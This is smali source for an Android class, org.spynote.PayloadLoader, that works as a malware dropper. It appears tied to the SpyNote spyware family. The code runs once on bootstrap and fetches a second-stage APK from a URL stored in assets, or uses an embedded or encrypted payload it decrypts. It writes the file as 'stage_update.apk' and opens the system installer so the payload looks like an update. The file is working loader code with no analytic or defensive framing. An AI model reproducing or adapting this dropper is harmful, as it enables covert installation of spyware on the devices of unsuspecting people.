.class public Lorg/spynote/PayloadLoader;

.super Ljava/lang/Object;

.source "PayloadLoader.java"





.method public static bootstrap(Landroid/content/Context;)V

    .locals 4



    if-eqz p0, :ret



    :try_start_0

    const-string v0, "dropper_v2"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0



    const-string v2, "done"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-nez v2, :ret



    invoke-static {p0}, Lorg/spynote/PayloadLoader;->tryInstall(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :ret



    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v2, "done"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :try_end_0

    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0



    :catch_0

    :ret

    return-void

.end method


.method public static installFromUi(Landroid/content/Context;)V
    .locals 0
    invoke-static {p0}, Lorg/spynote/PayloadLoader;->tryInstall(Landroid/content/Context;)Z
    return-void
.end method


.method private static tryInstall(Landroid/content/Context;)Z

    .locals 3



    const-string v0, "payload_url.txt"

    invoke-static {p0, v0}, Lorg/spynote/PayloadLoader;->readAsset(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :try_embed



    const-string v1, "http"

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :try_embed



    invoke-static {p0, v0}, Lorg/spynote/PayloadLoader;->downloadAndInstall(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    return v0



    :try_embed

    const-string v0, "payload.apk"

    invoke-static {p0, v0}, Lorg/spynote/PayloadLoader;->readAssetBytes(Landroid/content/Context;Ljava/lang/String;)[B

    move-result-object v0

    if-eqz v0, :try_enc



    invoke-static {p0, v0}, Lorg/spynote/PayloadLoader;->installBytes(Landroid/content/Context;[B)Z

    move-result v0

    return v0



    :try_enc

    const-string v0, "payload.enc"

    invoke-static {p0, v0}, Lorg/spynote/PayloadLoader;->readAssetBytes(Landroid/content/Context;Ljava/lang/String;)[B

    move-result-object v0

    if-eqz v0, :fail



    invoke-static {p0, v0}, Lorg/spynote/PayloadCrypto;->decrypt(Landroid/content/Context;[B)[B

    move-result-object v0

    if-eqz v0, :fail



    invoke-static {p0, v0}, Lorg/spynote/PayloadLoader;->installBytes(Landroid/content/Context;[B)Z

    move-result v0

    return v0



    :fail

    const/4 v0, 0x0

    return v0

.end method





.method private static readAsset(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    .locals 5

    :try_start_0

    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/16 v2, 0x400

    new-array v2, v2, [B

    :loop

    invoke-virtual {v0, v2}, Ljava/io/InputStream;->read([B)I

    move-result v3

    if-ltz v3, :done

    const/4 v4, 0x0

    invoke-virtual {v1, v2, v4, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :loop

    :done

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0

    :try_end_0

    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0

    const-string v0, ""

    return-object v0

.end method





.method private static readAssetBytes(Landroid/content/Context;Ljava/lang/String;)[B

    .locals 5

    :try_start_0

    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/16 v2, 0x400

    new-array v2, v2, [B

    :loop

    invoke-virtual {v0, v2}, Ljava/io/InputStream;->read([B)I

    move-result v3

    if-ltz v3, :done

    const/4 v4, 0x0

    invoke-virtual {v1, v2, v4, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :loop

    :done

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    return-object v0

    :try_end_0

    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0

    const/4 v0, 0x0

    return-object v0

.end method





.method private static downloadAndInstall(Landroid/content/Context;Ljava/lang/String;)Z

    .locals 6

    :try_start_0

    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    const-string v1, "GET"

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/16 v1, 0x7530

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    const/16 v2, 0xc8

    if-lt v1, v2, :fail

    const/16 v2, 0x12c

    if-ge v1, v2, :fail

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/16 v3, 0x800

    new-array v3, v3, [B

    :loop

    invoke-virtual {v1, v3}, Ljava/io/InputStream;->read([B)I

    move-result v4

    if-ltz v4, :done

    const/4 v5, 0x0

    invoke-virtual {v2, v3, v5, v4}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :loop

    :done

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    invoke-static {p0, v0}, Lorg/spynote/PayloadLoader;->installBytes(Landroid/content/Context;[B)Z

    move-result v0

    return v0

    :fail

    const/4 v0, 0x0

    return v0

    :try_end_0

    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0

    const/4 v0, 0x0

    return v0

.end method





.method private static installBytes(Landroid/content/Context;[B)Z

    .locals 7

    :try_start_0

    new-instance v0, Ljava/io/File;

    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    const-string v2, "stage_update.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    new-instance v1, Ljava/io/FileOutputStream;

    invoke-direct {v1, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {v1, p1}, Ljava/io/FileOutputStream;->write([B)V

    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V

    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x18

    if-lt v3, v4, :legacy_uri

    invoke-static {p0, v0}, Lorg/spynote/DropperFileProvider;->getUriForFile(Landroid/content/Context;Ljava/io/File;)Landroid/net/Uri;

    move-result-object v0

    goto :set_type

    :legacy_uri

    invoke-static {v0}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v0

    :set_type

    const-string v3, "application/vnd.android.package-archive"

    invoke-virtual {v1, v0, v3}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return v2

    :try_end_0

    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0

    const/4 v0, 0x0

    return v0

.end method

